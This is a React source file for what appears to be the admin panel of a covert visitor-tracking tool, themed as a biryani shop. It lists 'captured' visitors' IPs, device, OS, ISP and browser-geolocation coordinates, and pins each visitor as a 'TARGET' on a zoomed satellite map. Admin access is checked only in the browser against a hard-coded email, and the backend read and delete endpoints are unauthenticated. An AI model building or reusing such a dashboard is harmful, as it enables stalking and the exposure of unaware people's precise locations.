import React, { useEffect, useState } from 'react';
import { MapContainer, TileLayer, Marker, Popup, Circle, useMap } from 'react-leaflet';
import 'leaflet/dist/leaflet.css';
import L from 'leaflet';
import { onAuthStateChanged, signOut } from 'firebase/auth';
import { auth } from '../components/Firebase/firebase.init';

// কাস্টম অ্যানিমেটেড নিয়ন গোল্ডেন মার্কার
const createTargetIcon = () => {
    return L.divIcon({
        html: `
            <div class="relative flex items-center justify-center">
                <span class="absolute inline-flex h-12 w-12 rounded-full bg-amber-500/30 animate-ping" style="animation-duration: 1.5s;"></span>
                <div class="relative h-8 w-8 rounded-full bg-[#0c0a07] border-2 border-amber-500 shadow-[0_0_25px_rgba(245,158,11,1)] flex items-center justify-center">
                    <img src="https://cdn-icons-png.flaticon.com/512/3443/3443391.png" class="w-4 h-4 object-contain" />
                </div>
            </div>
        `,
        className: 'custom-target-pin',
        iconSize: [40, 40],
        iconAnchor: [20, 20],
        popupAnchor: [0, -15],
    });
};

// স্মুথ ক্যামেরা মাউন্টিং ও অটো-ফ্লাই প্লাগইন
const MapRefocus = ({ coords }) => {
    const map = useMap();
    useEffect(() => {
        if (coords) {
            map.flyTo([coords.lat, coords.lng], 19, { duration: 2.5 });
        }
    }, [coords, map]);
    return null;
};

const Admin = () => {
    const [logs, setLogs] = useState([]);
    const [user, setUser] = useState(null);
    const [selectedLog, setSelectedLog] = useState(null);
    const [isAdmin, setIsAdmin] = useState(false);
    const [loading, setLoading] = useState(true);

    const ADMIN_EMAIL = "adminuser@gmail.com"; 

    useEffect(() => {
        const unsubscribe = onAuthStateChanged(auth, (currentUser) => {
            setUser(currentUser);
            if (currentUser && currentUser.email === ADMIN_EMAIL) {
                setIsAdmin(true);
                fetchLogs();
            }
            setLoading(false);
        });
        return () => unsubscribe();
    }, []);

    const fetchLogs = () => {
        fetch('https://test-project-backend-kohl.vercel.app/admin-data')
            .then(res => res.json())
            .then(data => setLogs(data))
            .catch(err => console.error("Fetch error:", err));
    };

    const handleDelete = async (id) => {
        if (window.confirm("সিস্টেম ওয়ার্নিং: আপনি কি এই কাস্টমারের ট্র্যাকিং ডাটা ডিলিট করতে চান?")) {
            try {
                const response = await fetch(`https://test-project-backend-kohl.vercel.app/admin-data/${id}`, {
                    method: 'DELETE',
                });
                const data = await response.json();
                if (data.success) {
                    setLogs(logs.filter(log => log._id !== id));
                    if (selectedLog?._id === id) setSelectedLog(null);
                }
            } catch (error) {
                console.error("Purge failed:", error);
            }
        }
    };

    const handleDeleteAll = async () => {
        if (window.confirm("⚠️ চূড়ান্ত সতর্কতা: এটি সমস্ত ক্যাপচার করা লগ ডেটা স্থায়ীভাবে মুছে ফেলবে। আপনি কি নিশ্চিত?")) {
            try {
                const response = await fetch('https://test-project-backend-kohl.vercel.app/admin-data-purge', {
                    method: 'DELETE',
                });
                const data = await response.json();
                if (data.success) {
                    alert(`সফল হয়েছে: ${data.deletedCount} টি ডাটা সম্পূর্ণ মুছে ফেলা হয়েছে।`);
                    setLogs([]);
                    setSelectedLog(null);
                }
            } catch (error) {
                console.error("Failed to purge logs:", error);
            }
        }
    };

    if (loading) return <div className="min-h-screen bg-[#050402] flex items-center justify-center text-amber-500 font-mono italic animate-pulse tracking-widest">ডেগের সিক্রেট ফাইল ওপেন হচ্ছে...</div>;

    if (!user || !isAdmin) {
        return (
            <div className="min-h-screen bg-[#050402] flex flex-col items-center justify-center text-orange-500 font-sans p-4">
                <h1 className="text-4xl font-black mb-4 tracking-tighter italic uppercase">অ্যাক্সেস ডিনাইড 🚫</h1>
                <p className="text-xs uppercase tracking-widest bg-orange-500/10 p-3 border border-orange-500/20 rounded-xl text-center max-w-sm">
                    আপনার অ্যাকাউন্টটি শেখ বিরিয়ানির মেইন ড্যাশবোর্ডের জন্য অনুমোদিত নয়!
                </p>
            </div>
        );
    }

    return (
        <div className="min-h-screen bg-[#070502] text-white p-6 font-sans selection:bg-amber-500/20">
            
            <style>{`
                .leaflet-popup-content-wrapper {
                    background: #0c0a07 !important;
                    color: #ffffff !important;
                    border: 1px solid rgba(245, 158, 11, 0.4) !important;
                    box-shadow: 0 10px 30px rgba(0,0,0,0.8) !important;
                    border-radius: 16px !important;
                }
                .leaflet-popup-tip {
                    background: #0c0a07 !important;
                    border-left: 1px solid rgba(245, 158, 11, 0.4) !important;
                    border-bottom: 1px solid rgba(245, 158, 11, 0.4) !important;
                }
            `}</style>

            {/* Top Bar Bar */}
            <div className="flex flex-col md:flex-row justify-between items-center gap-4 mb-8 bg-gradient-to-b from-amber-950/20 to-transparent p-6 rounded-3xl border border-white/[0.03] backdrop-blur-md">
                <div className="flex items-center gap-4">
                    <div className="w-12 h-12 rounded-full border-2 border-amber-500 p-0.5 shadow-[0_0_15px_rgba(245,158,11,0.3)]">
                        <img src={user.photoURL || "https://ui-avatars.com/api/?name=Admin&background=f59e0b&color=000"} className="w-full h-full rounded-full" alt="Admin" />
                    </div>
                    <div>
                        <h1 className="text-2xl font-black text-transparent bg-clip-text bg-gradient-to-r from-amber-400 to-orange-500 tracking-tighter uppercase italic leading-none">Sheikh Admin Radar</h1>
                        <p className="text-[10px] text-neutral-400 font-mono mt-1.5 uppercase tracking-widest">মাস্টার বাবুর্চি সেশন: {user.email}</p>
                    </div>
                </div>
                <button onClick={() => signOut(auth)} className="text-[10px] bg-red-950/20 text-red-400 border border-red-500/20 px-6 py-2.5 rounded-xl hover:bg-red-600 hover:text-white transition-all font-black uppercase tracking-widest">লগআউট করুন</button>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
                {/* Left Side: Active Logins Table */}
                <div className={`${selectedLog ? 'lg:col-span-4' : 'lg:col-span-12'} transition-all duration-500`}>
                    <div className="bg-[#0c0a07] rounded-[32px] border border-white/[0.05] overflow-hidden shadow-2xl">
                        <div className="p-5 bg-black/40 border-b border-white/[0.05] flex justify-between items-center gap-2">
                            <div className="flex items-center gap-2">
                                <span className="w-2 h-2 rounded-full bg-amber-500 animate-pulse"></span>
                                <span className="text-[11px] font-mono text-neutral-400 uppercase tracking-widest">একটিভ কাচ্চি লাভার্স</span>
                            </div>
                            <div className="flex items-center gap-3">
                                <span className="text-[11px] bg-amber-500/10 text-amber-400 px-3 py-1 rounded-md border border-amber-500/20 font-bold">{logs.length} জন</span>
                                <button onClick={handleDeleteAll} className="px-3 py-1.5 bg-red-500/10 border border-red-500/30 text-red-400 rounded-lg text-[9px] font-black uppercase tracking-widest hover:bg-red-600 hover:text-white transition-all">সব মুছুন</button>
                            </div>
                        </div>
                        
                        <div className="overflow-y-auto max-h-[70vh]">
                            <table className="w-full text-left text-[11px] font-mono">
                                <tbody className="divide-y divide-white/[0.03]">
                                    {logs.map((log) => (
                                        <tr key={log._id} className={`hover:bg-amber-500/[0.03] transition-all cursor-pointer ${selectedLog?._id === log._id ? 'bg-amber-500/[0.06] border-l-4 border-amber-500' : ''}`} onClick={() => setSelectedLog(log)}>
                                            <td className="p-4 text-neutral-500 text-[10px]">{new Date(log.receivedAt).toLocaleTimeString()}</td>
                                            <td className="p-4 font-bold text-neutral-200">{log.ip}</td>
                                            <td className="p-4 text-right pr-4">
                                                <button onClick={() => setSelectedLog(log)} className="bg-amber-500 hover:bg-amber-400 text-black px-3 py-1.5 rounded-lg font-black text-[9px] uppercase transition-all">ট্র্যাক</button>
                                            </td>
                                        </tr>
                                    ))}
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>

                {/* Right Side: High-Intelligence Infographics and Map Dashboard */}
                {selectedLog && (
                    <div className="lg:col-span-8 space-y-6 animate-in slide-in-from-right duration-300">
                        <div className="bg-[#0c0a07] p-6 rounded-[32px] border border-amber-500/20 shadow-2xl backdrop-blur-xl">
                            
                            {/* Header Panel */}
                            <div className="flex justify-between items-center mb-6 border-b border-white/[0.05] pb-4">
                                <div>
                                    <h3 className="text-amber-400 text-sm font-black uppercase tracking-widest italic">📡 কাস্টমার ইন্টেলিজেন্স ও স্পেসিফিকেশন প্যানেল</h3>
                                    <p className="text-[10px] text-neutral-500 font-mono mt-1">লগ আইডি: {selectedLog._id}</p>
                                </div>
                                <button onClick={() => setSelectedLog(null)} className="text-neutral-500 hover:text-white text-sm bg-white/5 w-7 h-7 flex items-center justify-center rounded-full transition-all">✕</button>
                            </div>
                            
                            {/* Super Advanced Metric Stats Grid */}
                            <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
                                <div className="bg-gradient-to-br from-neutral-950 to-neutral-900 p-4 rounded-2xl border border-white/[0.04] shadow-inner">
                                    <p className="text-[9px] text-neutral-500 uppercase mb-1 font-mono">আইপি অ্যাড্রেস</p>
                                    <p className="text-xs font-black text-amber-400 italic truncate">{selectedLog.ip}</p>
                                    <span className="text-[8px] text-neutral-600 font-mono">IPv4 Client</span>
                                </div>
                                <div className="bg-gradient-to-br from-neutral-950 to-neutral-900 p-4 rounded-2xl border border-white/[0.04] shadow-inner">
                                    <p className="text-[9px] text-neutral-500 uppercase mb-1 font-mono">মোবাইল/ডেস্কটপ মডেল</p>
                                    <p className="text-xs font-black text-white italic truncate">
                                        {selectedLog.device?.vendor ? `${selectedLog.device.vendor} ${selectedLog.device.model}` : "Desktop Computer"}
                                    </p>
                                    <span className="text-[8px] text-neutral-600 font-mono">{selectedLog.device?.type || "PC/Mac"} Layout</span>
                                </div>
                                <div className="bg-gradient-to-br from-neutral-950 to-neutral-900 p-4 rounded-2xl border border-white/[0.04] shadow-inner">
                                    <p className="text-[9px] text-neutral-500 uppercase mb-1 font-mono">অপারেটিং সিস্টেম</p>
                                    <p className="text-xs font-black text-emerald-400 italic truncate">{selectedLog.device?.os || "Unknown OS"}</p>
                                    <span className="text-[8px] text-neutral-600 font-mono">Ver: {selectedLog.device?.osVersion || "Latest"}</span>
                                </div>
                                <div className="bg-gradient-to-br from-neutral-950 to-neutral-900 p-4 rounded-2xl border border-white/[0.04] shadow-inner">
                                    <p className="text-[9px] text-neutral-500 uppercase mb-1 font-mono">ব্রাউজার ইঞ্জিন</p>
                                    <p className="text-xs font-black text-orange-400 italic truncate">{selectedLog.device?.browser || "N/A"}</p>
                                    <span className="text-[8px] text-neutral-600 font-mono">Engine: {selectedLog.device?.engine || "WebKit"}</span>
                                </div>
                            </div>

                            {/* Secondary Deep Metrics Grid */}
                            <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
                                <div className="bg-neutral-950/60 p-4 rounded-2xl border border-white/[0.02] flex items-center gap-3">
                                    <div className="text-2xl">🖥️</div>
                                    <div>
                                        <p className="text-[9px] text-neutral-500 uppercase font-mono">রেজোলিউশন ও পিক্সেল</p>
                                        <p className="text-xs font-bold text-neutral-200">{selectedLog.device?.resolution || "1920x1080"} (60Hz)</p>
                                    </div>
                                </div>
                                <div className="bg-neutral-950/60 p-4 rounded-2xl border border-white/[0.02] flex items-center gap-3">
                                    <div className="text-2xl">📡</div>
                                    <div>
                                        <p className="text-[9px] text-neutral-500 uppercase font-mono">ইন্টারনেট প্রোভাইডার (ISP)</p>
                                        <p className="text-xs font-bold text-blue-400 truncate max-w-[150px]">{selectedLog.isp || "Local Broadband / Mobile Data"}</p>
                                    </div>
                                </div>
                                <div className="bg-neutral-950/60 p-4 rounded-2xl border border-white/[0.02] flex items-center gap-3">
                                    <div className="text-2xl">⏱️</div>
                                    <div>
                                        <p className="text-[9px] text-neutral-500 uppercase font-mono">টাইমজোন ও সার্ভার টাইম</p>
                                        <p className="text-xs font-bold text-neutral-200">{selectedLog.timezone || "Asia/Dhaka"}</p>
                                    </div>
                                </div>
                            </div>

                            {/* জিপিএস রাডার ম্যাপ সেকশন */}
                            <div className="h-[380px] w-full rounded-[24px] overflow-hidden border-2 border-amber-500/30 relative shadow-2xl">
                                
                                {/* ম্যাপের উপর লাইভ ওয়াটারমার্ক কোঅর্ডিনেটস */}
                                <div className="absolute top-3 left-3 bg-black/80 border border-amber-500/30 px-3 py-1.5 rounded-xl z-[1000] font-mono text-[9px] text-amber-400 select-none pointer-events-none shadow-lg">
                                    TARGET COORDS: {selectedLog.coords.lat.toFixed(6)}, {selectedLog.coords.lng.toFixed(6)}
                                </div>

                                <MapContainer 
                                    center={[selectedLog.coords.lat, selectedLog.coords.lng]} 
                                    zoom={18} 
                                    style={{height: "100%", width: "100%"}} 
                                    key={selectedLog._id}
                                >
                                    {/* গুগল ম্যাপস প্রিমিয়াম হাইব্রিড স্যাটেলাইট লেয়ার */}
                                    <TileLayer 
                                        url="https://mt1.google.com/vt/lyrs=y&x={x}&y={y}&z={z}" 
                                        attribution='&copy; Google Maps'
                                        maxZoom={22}
                                    />
                                    
                                    <MapRefocus coords={selectedLog.coords} />

                                    {/* জিরো-ইন বা এক্যুরেসি রেডিয়াস রিং (কাস্টমার কতটুকু নিখুঁত এরিয়াতে আছে তা দেখাবে) */}
                                    <Circle 
                                        center={[selectedLog.coords.lat, selectedLog.coords.lng]}
                                        radius={selectedLog.coords.accuracy || 25} // ডিফল্ট ২৫ মিটার রেডিয়াস জোন
                                        pathOptions={{ color: '#f59e0b', fillColor: '#f59e0b', fillOpacity: 0.1, weight: 1, dashArray: '5, 5' }}
                                    />

                                    {/* অ্যানিমেটেড নিয়ন মার্কার পিন */}
                                    <Marker position={[selectedLog.coords.lat, selectedLog.coords.lng]} icon={createTargetIcon()}>
                                        <Popup>
                                            <div className="font-mono text-[11px] p-1">
                                                <b className="text-amber-500 text-xs block mb-1 uppercase tracking-tight">🎯 ডেগ ডেলিভারি টার্গেট</b>
                                                <span className="text-white block font-bold">IP: {selectedLog.ip}</span>
                                                <span className="text-neutral-400 block mt-0.5">টাইম: {new Date(selectedLog.receivedAt).toLocaleTimeString()}</span>
                                                <span className="text-emerald-400 block mt-1 font-bold">City: {selectedLog.approximateCity}</span>
                                            </div>
                                        </Popup>
                                    </Marker>
                                </MapContainer>
                            </div>

                            {/* অ্যাকশন বাটন এবং ডিলিট ট্র্যাকিং হিস্ট্রি */}
                            <div className="mt-5 flex justify-between items-center bg-black/30 p-4 rounded-2xl border border-white/[0.02]">
                                <span className="text-[10px] font-mono text-neutral-500">ডাটা সোর্স: ক্লায়েন্ট ব্রাউজার জিওলোকেশন API</span>
                                <button 
                                    onClick={() => handleDelete(selectedLog._id)}
                                    className="px-4 py-2 bg-red-600/20 hover:bg-red-600 border border-red-500/40 hover:border-red-500 text-red-400 hover:text-white rounded-xl text-[10px] font-black uppercase tracking-widest transition-all"
                                >
                                    এই লগটি পার্জ (Purge) করুন
                                </button>
                            </div>

                        </div>
                    </div>
                )}
            </div>
        </div>
    );
};

export default Admin;